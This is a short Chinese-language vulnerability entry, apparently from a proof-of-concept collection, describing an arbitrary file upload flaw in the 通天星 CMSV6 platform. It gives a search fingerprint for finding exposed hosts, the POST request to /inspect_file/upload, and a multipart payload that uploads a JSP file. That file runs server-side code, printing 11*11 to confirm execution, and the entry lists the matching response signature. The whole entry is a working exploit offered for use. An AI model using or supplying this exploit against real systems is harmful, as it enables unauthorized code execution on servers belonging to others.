# 通天星-CMSV6-inspect_file-upload任意文件上传漏洞

通天星-CMSV6-inspect_file-upload ｜ 文件上传 ｜ —
- **指纹**：`body="808gps"`
- **请求**：`POST /inspect_file/upload HTTP/1.1`

**Payload**
```
-----------------------------7db372eb000e2
Content-Disposition: form-data; name="uploadFile"; filename="dudesite.jsp"
Content-Type: application/octet-stream
<% out.println(11*11);%>
-----------------------------7db372eb000e2--
```
- **响应特征**：200 121